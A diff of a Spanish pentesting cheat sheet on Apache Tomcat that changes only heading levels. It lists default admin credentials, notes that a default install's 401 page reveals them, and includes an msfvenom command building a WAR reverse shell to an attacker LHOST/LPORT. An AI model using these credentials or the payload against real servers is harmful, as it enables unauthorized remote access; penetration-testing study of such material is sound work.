@@ -1,9 +1,9 @@
 
-## Acceso por defecto al portal
+### Acceso por defecto al portal
 
 Con una instalación por defecto de tomcat, al intentar entrar al panel de administración, si no sabemos la contraseña, al pulsar en **cancel**, por defecto nos redirige a un fichero que dice: **401 Unauthorized** y más abajo nos muestra el **usuario y contraseña**
 
-## Credenciales por defecto
+### Credenciales por defecto
 |Username     |Password  |
 |-------------|----------|
 |admin        |password  |
@@ -31,7 +31,7 @@ Con una instalación por defecto de tomcat, al intentar entrar al panel de admin
 |tomcat       |<blank>   |
 |tomcat       |admin     |
 |tomcat       |changethis|
-## Reverse shell tomcat con msfvenom
+### Reverse shell tomcat con msfvenom
 #### Método 1
 ```bash
 msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o revshell.war
